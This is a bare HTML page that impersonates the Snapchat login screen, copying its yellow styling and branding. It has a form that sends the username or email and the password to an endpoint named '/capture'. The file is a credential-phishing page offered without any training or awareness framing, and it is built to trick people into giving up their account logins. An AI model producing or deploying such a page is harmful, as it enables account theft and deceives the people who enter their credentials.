<!DOCTYPE html>
<html>
<head>
    <title>Snapchat Login</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #fffc00; }
        .login-box { width: 300px; margin: 100px auto; padding: 20px; background: #fff; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
        .login-box h1 { text-align: center; color: #000; font-size: 24px; margin-bottom: 20px; }
        .login-box input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        .login-box button { width: 100%; padding: 10px; background: #fffc00; color: #000; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Snapchat</h1>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
